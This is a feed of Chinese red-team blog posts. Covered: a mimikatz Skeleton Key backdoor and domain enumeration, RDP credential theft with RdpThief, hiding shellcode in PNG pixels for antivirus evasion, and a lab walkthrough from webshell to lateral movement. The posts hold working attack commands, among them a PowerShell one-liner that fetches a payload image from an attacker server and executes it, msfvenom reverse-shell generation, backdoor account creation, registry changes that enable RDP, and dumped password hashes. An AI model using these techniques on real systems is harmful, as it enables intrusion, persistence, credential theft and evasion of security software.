万能密码后门</h3><p>为了防止域控权限丢失，我还留下了一个 <code>Skeleton Key</code> 后门，这个也不算后门，只能算一个<code>万能密码</code>，原理就是通过在 <code>lsass</code> 进程中创建了一个万能密码，通过这个万能密码我们可以随时访问到当前域控！<br>通过 <code>mimikatz</code> 在域控制器上安装 <code>Skeleton Key</code>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; mimikatz privilege::debug</span><br><span class="line">beacon&gt; mimikatz misc::skeleton</span><br></pre></td></tr></table></figure><p><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/B9Oajc.png"><br>安装成功后我们可以通过其他域内主机的普通域用户，使用万能账号域管用户：<code>a-xxxxx\administrator</code> 密码 <code>mimikatz</code> 利用 <code>IPC</code> 连接域控：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; shell net use \\xxxxx-PDM\c$ /user:<span class="string">&quot;a-xxxxx\administrator&quot;</span> <span class="string">&quot;mimikatz&quot;</span></span><br><span class="line">beacon&gt; shell dir \\xxxxx-PDM\c$</span><br></pre></td></tr></table></figure><p><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/WhXbI9.png"></p><h2 id="域内信息搜集整理"><a href="#域内信息搜集整理" class="headerlink" title="域内信息搜集整理"></a>域内信息搜集整理</h2><p>为了能够梳理当前域内的信息，我使用的是 <code>BloodHound</code> 分析当前域环境的各个关系！<br>先下载：<a href="Neo4j">https://neo4j.com/artifact.php?name=neo4j-community-3.4.4-windows.zip</a><br>在 <code>cmd</code> 下输入命令 <code>neo4j.bat console</code> 启动 <code>Neo4j</code> 服务：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/R3VVMa.png"><br>这个时候访问本地 <code>web</code>：<code>http://127.0.0.1:7474/browser/</code>  ，默认账号密码为：<code>neo4j</code>（然后会让你修改一次密码）<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/2PknpV.png"><br>之后安装 <code>Bloodhound</code> ：<a href="Bloodhound">https://github.com/BloodHoundAD/BloodHound/releases/download/1.5.2/BloodHound-win32-x64.zip</a><br>下载完成后解压，进入目录找到 <code>BloodHound</code> 并运行：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/CPkCZW.png"><br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/Gg08GR.png"><br>现在已经完成了安装！之后需要通过 <code>SharpHound.exe</code> 提权域内所有信息：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/2E3Hgq.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell C:\Windows\Temp\BloodHound.exe -c all</span><br></pre></td></tr></table></figure><p>在这期间它会进行大量的 <code>ldap</code> 查询域内数据，等运行完后会在当前目录下生成一个 <code>当前时间_BloodHound.zip</code> 的文件！但是发现出问题了，一直不能运行：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/KjFKTK.png"><br>通过分析才知道 <code>2012</code> 版本可以用这个，因为 <code>.net</code> 版本有问题.<br>没事，我们换种方法，通过 <code>csvde</code> 也能帮我们梳理域内信息，具体用法：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">csvde -setspn [域的名字] -f [文件名].csv</span><br><span class="line">csvde -setspn A-xxxxx -f c:\windows\temp\domain.csv</span><br></pre></td></tr></table></figure><p><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/jDqBlk.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">LDAP的存储规则：一般存储的是域的信息</span><br><span class="line">区分名（DN，Distinguished Name）一个条目的区分名称叫做“dn”或者叫做区分名。在一个目录中这个名称总是唯一的。</span><br><span class="line">CN=Common Nmae 为用户名或服务器名，最长可以到80个字符，可以为中文。</span><br><span class="line">OU=Organization Unit为组织单元，最多可以有四级，没级最长32个字符，可以为中文。</span><br><span class="line">O=Organization为组织名，可以3-64个字符长度。</span><br><span class="line">C=Country为国家名，可选，为2个字符长度。</span><br></pre></td></tr></table></figure><p><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/YMgKHi.png"><br>还可以通过 <code>spn</code> 查询域内详细信息：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">查看当前域内所有的SPN： setspn  -Q  */*</span><br><span class="line">查看指定域 test.com 注册的SPN：setspn -T [域的名字] -Q */*</span><br><span class="line"></span><br><span class="line">setspn -T A-xxxxx -Q */*  &gt; c:\windows\temp\domain.txt</span><br></pre></td></tr></table></figure><p><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/aJ5RxO.png"><br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/zype63.png"><br>之所以要获取目标域的完整 <code>spn</code> 记录，核心就是为了摸清目标域内所有敏感机器资产的具体分布情况，这样方便我们后续单独对这些机器进行逐个“重点突破”，我们还可以拿着这些获取到的机器名，来快速完整探测当前域内的所有存活主机！<br>第一种方法当然也可以通过 <code>nbtscan</code> 来快速发现内网机器存活，通过 <code>nbtscan</code> 跑出来的结果发现机器名和域名能够帮我们快速识别哪些机器可能是在域内，哪些机器是我们后期要重点关照的：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/qiJidN.png"><br>第二种方式可以通过 <code>Metasploit</code> + <code>cs</code> 的 <code>socks</code> 来帮我探测内网主机存活是否存在域还是工作组以及是什么系统，关于 <code>Metasploit</code> 的使用我之前也发过相关文章到公众号，这个就不再多阐述：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; use auxiliary/scanner/smb/smb_version</span><br><span class="line">msf6 &gt; <span class="built_in">set</span> rhosts 192.168.2.0/24</span><br><span class="line">msf6 &gt; <span class="built_in">set</span> threads 16（实际上根据情况，可以把线程调小点，因为我现在是凌晨，所以调到了最大）</span><br><span class="line">msf6 &gt; run</span><br><span class="line">msf6 &gt; services</span><br></pre></td></tr></table></figure><p><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/Xbvvq4.png"><br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/wnkgOT.png"><br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/4XintF.png"><br>从上图可以看到，大部分系统都是 <code>XP</code> 这说明可以利用永恒之蓝，当然这都是后话了！<br>第三种方式可以通过 <code>dnsdump</code> 快速根据域内机器名获取到对应的 <code>IP</code> 是多少！<br><code>dnsdump</code> 下载地址是：<a href="dnsdump">https://github.com/dirkjanm/adidnsdump</a><br>大家可以根据实际情况可以把 <code>py</code> 文件打包成 <code>exe</code> 或者可以直接通过 <code>proxychains</code> + <code>socks</code> 也能运行！我这里就直接在当前机器运行 <code>exe</code>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dnsdump.exe -u 域名\域用户 -p 域密码  域控制器名 -r </span><br><span class="line"></span><br><span class="line">C:\Windows\temp\dnsdump.exe -u A-xxxxx\administrator -p password xxxxx-PDM -r</span><br></pre></td></tr></table></figure><p><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/pcEVbm.png"><br>然后就会在当前路径下生成一个文件：<code>records.csv</code>:<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/4iP92m.png"><br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/N4XxKF.png"><br>这个时候对应的<code>机器名</code>的对应 <code>IP</code> 就一目了然了！<br>当然还要去看看当前机器有哪些网段，<code>ipconfig /all</code> 是看不出到底还有哪些网段可以访问的，这个时候我们可以看看<code>路由</code>，分析<code>子网掩码</code>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">route <span class="built_in">print</span></span><br></pre></td></tr></table></figure><p><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/Pbzy8q.png"><br>还可以通过查看网络连接看看有没有和其他 <code>IP</code> 进行链接：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -ano</span><br></pre></td></tr></table></figure><p><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/c7PTFg.png"><br>这台机器很显然就只有 <code>192</code> 这个段！</p><h2 id="域内定向打击"><a href="#域内定向打击" class="headerlink" title="域内定向打击"></a>域内定向打击</h2><p>到这里内网渗透其实本质上已经结束了，但是实际上内网渗透拿到域控才刚开始，如果是做 <code>APT</code> 需要对某个区、某个部门、某个人的电脑进行渗透，这个时候就需要长时间去了解这个内网环境，找到你要攻击的人的主机/服务器对应在内网的那个<code>IP</code>，这是需要花很长时间去搜集信息的，所以说内网渗透的核心其实就是信息搜集！<br>实际上内网渗透这才刚开始，接下来对域内某台主机进行定向攻击渗透，会用到各种手段！<br>未完待续。。。</p><h2 id="公众号"><a href="#公众号" class="headerlink" title="公众号"></a>公众号</h2><p><strong>若有好的建议和合作可以通过公众号与我联系！</strong><br>微信公众号：<code>渗透攻击红队</code><br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/logo/vxgzh.jpeg"></p>]]></content>
      
      
      <categories>
          
          <category> redTeam </category>
          
      </categories>
      
      
        <tags>
            
            <tag> redTeam </tag>
            
            <tag> APT </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>内网渗透中当 RDP 凭证没勾选保存，如何获取到明文凭证信息？</title>
      <link href="/2021/07/01/dumping-rdp-credentials/"/>
      <url>/2021/07/01/dumping-rdp-credentials/</url>
      
        <content type="html"><![CDATA[<blockquote><p>在内网渗透过程中常常会碰到当前跳板机有 <code>RDP</code> 的连接记录，有些管理员会勾选保存密码，这个时候就可以通过 <code>mimikatz</code> 来获取明文凭证；但有些管理员就不会勾选保存密码，这个时候我们如何获取到 <code>RDP</code> 的连接凭证？</p></blockquote><h2 id="SharpRDPThief"><a href="#SharpRDPThief" class="headerlink" title="SharpRDPThief"></a>SharpRDPThief</h2><p><code>SharpRDPThief</code> 是 <code>RDPThief</code> 的 <code>C#</code> 实现。它使用 <code>EasyHook</code> 将一个 <code>DLL</code> 注入 <code>mstsc.exe</code>，然后它会挂钩 <code>CryptProtectMemory api</code> 调用。<code>hook</code> 将从传递给 <code>CryptProtectMemory</code> 的地址中获取密码，然后通过 <code>EasyHook</code> 的 <code>IPC</code> 服务器将其发送到主进程。<br>目前这只是概念实现的证明，需要 <code>RDPHook.dll</code> 与 <code>SharpRDPThief.exe</code> 位于同一目录中。<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/eidnEI.jpg"><br>此时如果客户端使用了 <code>mstsc</code> 并输入了 <code>user</code>、<code>pass</code> ：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/Z28H8Q.jpg"><br><code>SharpRDPThief</code>  就会把 <code>RDPhook.dll</code> 注入到 <code>mstsc</code> 进程从而获取到 <code>user</code>、<code>pass</code>：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/ndCgdb.jpg"></p><h2 id="RdpThief"><a href="#RdpThief" class="headerlink" title="RdpThief"></a>RdpThief</h2><p><code>RdpThief</code> 本身是一个独立的 <code>DLL</code>，当它被注入到 <code>mstsc.exe</code> 进程中时，将执行 <code>API</code> 挂钩，提取明文凭据并将它们保存到文件中。<br>当在 <code>Cobalt Strike</code> 上加载 a<code>ggressor</code> 脚本时，三个新命令将可用：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">rdpthief_enable – 启用新 mstsc.exe 进程的心跳检查并注入它们。</span><br><span class="line">rdpthief_disable – 禁用新 mstsc.exe 的心跳检查，但不会卸载已加载的 DLL。</span><br><span class="line">rdpthief_dump – 打印提取的凭据（如果有就会打印出来）</span><br></pre></td></tr></table></figure><p><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/1eGILs.jpg"><br>可能是我 <code>CS</code> 版本问题，把 <code>rdpthief_dump</code> 的结果复制到文本就能看到 <code>ip</code>、<code>user</code>、<code>pass</code> 了：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/mcIEbw.jpg"><br>它实际把凭据保存到了 <code>%temp%\data.bin</code> 文件里：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/cFDiFO.jpg"><br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/7SrA0T.jpg"></p><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://www.mdsec.co.uk/2019/11/rdpthief-extracting-clear-text-credentials-from-remote-desktop-clients/">https://www.mdsec.co.uk/2019/11/rdpthief-extracting-clear-text-credentials-from-remote-desktop-clients/</a><br><a href="https://github.com/0x09AL/RdpThief">https://github.com/0x09AL/RdpThief</a><br><a href="https://github.com/passthehashbrowns/SharpRDPThief">https://github.com/passthehashbrowns/SharpRDPThief</a></p><h2 id="公众号"><a href="#公众号" class="headerlink" title="公众号"></a>公众号</h2><p><strong>若有好的建议和合作可以通过公众号与我联系！</strong><br>微信公众号：<code>渗透攻击红队</code><br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/logo/vxgzh.jpeg"></p>]]></content>
      
      
      <categories>
          
          <category> RedTeam </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内网渗透 </tag>
            
            <tag> 红队技术 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Shellcode 隐写到像素 RGB 免杀上线到 CobaltStrike、Metasploit</title>
      <link href="/2021/06/27/bypass-image-rgb/"/>
      <url>/2021/06/27/bypass-image-rgb/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote><p>一般来说一些 <code>AV</code> 对于图片并未做检测处理，其原理可以仅使用有效载荷数据来创建新图像，也可以将有效载荷嵌入到现有图像的最低有效字节中，以便看起来像实际的图片。图像保存为<code>PNG</code>，并且可以无损压缩，而不会影响执行有效载荷的能力，因为数据本身以颜色存储。创建新图像时，通常会对常规 <code>PowerShell</code> 脚本进行显着压缩，通常会生成 <code>png</code>，其文件大小约为原始脚本的50％，非常方便。</p></blockquote><h2 id="CobaltStrike-免杀"><a href="#CobaltStrike-免杀" class="headerlink" title="CobaltStrike 免杀"></a>CobaltStrike 免杀</h2><p>首先生成一个 <code>ps1</code> 的文件：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/IVWClM.jpg"><br>然后把生成的文件放到和 <code>Invoke-PSImage.ps1</code> 文件同一目录：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/pqBsy4.jpg"><br>然后再准备一张普通图片用于生成一个带有 <code>Payload</code> 的图片：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/LE8g1U.jpg"><br>之后使用命令生成一个带有 <code>shellcode</code> 的图片：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1、设置执行策略</span></span><br><span class="line">Set-ExecutionPolicy Unrestricted -Scope CurrentUser</span><br><span class="line"><span class="comment"># 2、导入 ps1 文件</span></span><br><span class="line">Import-Module .\Invoke-PSimage.ps1</span><br><span class="line"><span class="comment"># 3、生成 shellcode 的图片</span></span><br><span class="line">Invoke-PSImage -Script .\payload.ps1 -Image .\saulGoodman.jpg -Out .\saulGoodman.png -Web</span><br></pre></td></tr></table></figure><p><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/8L6DE2.jpg"><br>之后就会得到这么一串 <code>Powershell</code> 代码：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sal a New-Object;Add-Type -A System.Drawing;<span class="variable">$g</span>=a System.Drawing.Bitmap((a Net.WebClient).OpenRead(<span class="string">&quot;http://example.com/saul.png&quot;</span>));<span class="variable">$o</span>=a Byte[] 3584;(0..13)|%&#123;foreach(<span class="variable">$x</span> <span class="keyword">in</span>(0..255))&#123;<span class="variable">$p</span>=<span class="variable">$g</span>.GetPixel(<span class="variable">$x</span>,<span class="variable">$_</span>);<span class="variable">$o</span>[<span class="variable">$_</span>*256+<span class="variable">$x</span>]=([math]::Floor((<span class="variable">$p</span>.B-band15)*16)-bor(<span class="variable">$p</span>.G -band 15))&#125;&#125;;IEX([System.Text.Encoding]::ASCII.GetString(<span class="variable">$o</span>[0..3550]))</span><br></pre></td></tr></table></figure><p>当前目录还会多出了一个 <code>saul.png</code> 的图片：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/zlP34Y.jpg"><br>我们把里面的 <code>http://example.com/saul.png</code> 修改为我们自己的 <code>http</code> 服务，我首先再服务器上开启了一个 <code>http</code> 服务，然后把生成的 <code>saul.png</code> 放到里面用于远程加载：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/q2QKfl.jpg"><br>这个时候我们修改 <code>powershell</code> 代码为我们自己的 <code>http</code> ：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sal a New-Object;Add-Type -A System.Drawing;<span class="variable">$g</span>=a System.Drawing.Bitmap((a Net.WebClient).OpenRead(<span class="string">&quot;http://192.168.2.14/saul.png&quot;</span>));<span class="variable">$o</span>=a Byte[] 3584;(0..13)|%&#123;foreach(<span class="variable">$x</span> <span class="keyword">in</span>(0..255))&#123;<span class="variable">$p</span>=<span class="variable">$g</span>.GetPixel(<span class="variable">$x</span>,<span class="variable">$_</span>);<span class="variable">$o</span>[<span class="variable">$_</span>*256+<span class="variable">$x</span>]=([math]::Floor((<span class="variable">$p</span>.B-band15)*16)-bor(<span class="variable">$p</span>.G -band 15))&#125;&#125;;IEX([System.Text.Encoding]::ASCII.GetString(<span class="variable">$o</span>[0..3550]))</span><br></pre></td></tr></table></figure><p>然后运行上线的 <code>powershell</code> 代码上线：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/q3QyT7.jpg"><br><code>MSF</code>的话就生成这个：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1、msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.253.8 LPORT=5555 -f psh-reflection &gt; msf-dayu.ps1</span><br><span class="line"></span><br><span class="line">2、Set-ExecutionPolicy Unrestricted -Scope CurrentUser</span><br><span class="line"></span><br><span class="line">3、Import-Module .\Invoke-PSimage.ps1</span><br><span class="line"></span><br><span class="line">4、Invoke-PSImage -Script .\cs-dayu.ps1 -Image .\dayu.jpg -Out .\cs-dayu.png -Web</span><br></pre></td></tr></table></figure><h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="https://github.com/dayuxiyou/Invoke-PSImage">https://github.com/dayuxiyou/Invoke-PSImage</a></p><p><a href="https://www.freebuf.com/articles/web/262978.html">https://www.freebuf.com/articles/web/262978.html</a></p><h2 id="公众号"><a href="#公众号" class="headerlink" title="公众号"></a>公众号</h2><p><strong>若有好的建议和合作可以通过公众号与我联系！</strong><br>微信公众号：<code>渗透攻击红队</code><br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/logo/vxgzh.jpeg"></p>]]></content>
      
      
      <categories>
          
          <category> Bypass </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Bypass </tag>
            
            <tag> 免杀 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>从外网代码审计到三层内网各种漏洞拿到域控</title>
      <link href="/2021/06/09/redTeam-1/"/>
      <url>/2021/06/09/redTeam-1/</url>
      
        <content type="html"><![CDATA[<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=1367358886&auto=1&height=66"></iframe><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/XcCJfM.jpg"><br>本次靶场要求：<br>提示： <a href="http://www.cocat.cc/web.zip">http://www.cocat.cc/web.zip</a><br>四个 <code>root.txt</code> 分别在四台机子用户目录下 <code>拿到三个及格</code> <code>拿下四个满分</code></p><h2 id="代码审计-Getshell"><a href="#代码审计-Getshell" class="headerlink" title="代码审计 Getshell"></a>代码审计 Getshell</h2><p>首先是一个站：cocat.cc<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/Q85dTv.jpg"><br>通过提示把它的备份文件下载到了本地进行审计：<a href="http://www.cocat.cc/web.zip">http://www.cocat.cc/web.zip</a><br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/7ucmM0.jpg"></p><h2 id="Bypass-突破执行命令"><a href="#Bypass-突破执行命令" class="headerlink" title="Bypass 突破执行命令"></a>Bypass 突破执行命令</h2><p>通过审计拿到了一个 webshell：<a href="http://www.cocat.cc/kss_tool/_webup.php">http://www.cocat.cc/kss_tool/_webup.php</a><br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/AQWnLh.jpg"><br>由于当前环境不能执行命令，函数都写死了：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/x4nSCi.jpg"><br>通过翻文件翻到了 <code>Mysql</code> 的配置文件：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/dqgLUW.jpg"><br>本想尝试 <code>Mysql udf</code> 提权绕过发现 <code>Mysql</code> 版本大于 <code>5.1</code> ：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/3zeFtD.jpg"></p><h3 id="拿到宝塔后台权限"><a href="#拿到宝塔后台权限" class="headerlink" title="拿到宝塔后台权限"></a>拿到宝塔后台权限</h3><p>由于当前 <code>web</code> 是宝塔搭建的:<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/wubTCy.jpg"><br>通过翻文件找到了宝塔后台地址：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:/BtSoft/panel/data/admin_path.pl</span><br></pre></td></tr></table></figure><p><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/CdkKrH.jpg"><br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/Y0sh7p.jpg"><br>然后通过把宝塔的 <code>default.db</code> 文件下载到本地打开，<code>users</code> 表里就是宝塔的登陆账号密码：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/ktnP65.jpg"><br><code>md5</code> 是肯定解密不出来的：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/CImb4L.jpg"><br>这个时候需要替换 <code>md5</code> 或者添加一个用户：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/74ktDN.jpg"><br>然后把文件保存，上传到目标宝塔目录下：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/PcMi5c.jpg"><br>这个时候使用账号 <code>saulGoodmang</code> 密码 <code>123456</code> 去登陆：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/vAuUxu.jpg"><br>手动把禁用的函数关闭：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/dZH8bO.jpg"><br>然后给他来个重启：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/n41yfZ.jpg"><br>命令执行强行绕过：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/02f1Cm.jpg"></p><h3 id="拿到第一个-root-txt"><a href="#拿到第一个-root-txt" class="headerlink" title="拿到第一个 root.txt"></a>拿到第一个 root.txt</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;moonsec-c20ad4d76fe97759aa27a0c99bff6710-1&#125;</span><br></pre></td></tr></table></figure><p><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/l4PGJh.jpg"></p><h2 id="内网渗透一"><a href="#内网渗透一" class="headerlink" title="内网渗透一"></a>内网渗透一</h2><p>通过查看进程发现有<code>火绒AV</code>：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/4UaLas.jpg"><br>随即做免杀上线到 <code>CS</code>：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/xvj65T.jpg"><br>发现当前内网应该是有其他主机存活的：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/eZrnGH.jpg"><br>通过 <code>nbtscan</code> 发现内网还有一台主机存活：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/KWP6wi.jpg"><br>通过 <code>fscan</code> 也扫描出来内网资产了：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/W3dyzX.jpg"><br>为了进内网直接做了一个 <code>frp socks</code> 代理进去：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/85FRm8.jpg"><br>通过 <code>lengyi</code> 老哥的脚本绕过火绒添加了一个用户：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hacker 密码：P@ssw0rd</span><br></pre></td></tr></table></figure><p><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/ELFKe3.jpg"><br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/8vtTjI.jpg"><br>然后开启了它的 <code>3389</code>:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 0 /f</span><br></pre></td></tr></table></figure><p><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/woto8N.jpg"><br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/Fg29dd.jpg"><br>为了方便我把 <code>shell</code> 弹到了<code>msf</code>：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/djqpOn.jpg"><br>然后抓到了 <code>hash</code>：（由于是 windows 2012 明文是抓不了的，只能抓 hash）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; hashdump </span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:de935c6087ec367d3ef786915a4edcce:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">hacker:1003:aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42:::</span><br><span class="line">mysql:1002:aad3b435b51404eeaad3b435b51404ee:291376866817cf2ccfe198308e5f925b:::</span><br><span class="line">www.saulgoodman.cn:1001:aad3b435b51404eeaad3b435b51404ee:894f353e870620b186a9a46ce56ac8f1:::</span><br></pre></td></tr></table></figure><p>通过解密得到了 <code>administrator</code> 的密码：<code>QWEasd444</code></p><h3 id="内网横向移动-192-168-59-4"><a href="#内网横向移动-192-168-59-4" class="headerlink" title="内网横向移动-192.168.59.4"></a>内网横向移动-192.168.59.4</h3><p>通过 <code>msf</code> 对内网进行扫描 <code>arp</code> 存活发现了几台机器：（之前没扫描出来应该是有防火墙）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">post/windows/gather/arp_scanner</span><br></pre></td></tr></table></figure><p><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/QS9PWe.jpg"><br><code>192.168.59.1</code> 就不用看了是网关，<code>192.168.59.4</code> 就是内网另一台主机！<br>随后 <code>proxychains</code> + <code>nmap</code> 对 <code>192.168.59.4</code> 进行扫描探测端口服务：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains nmap -sT -sV -Pn -n -p22,80,139,135,445,3306,1433,6379  192.168.59.4</span><br></pre></td></tr></table></figure><p><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/FfkbkQ.jpg"><br>发现开放的端口有：<br><img 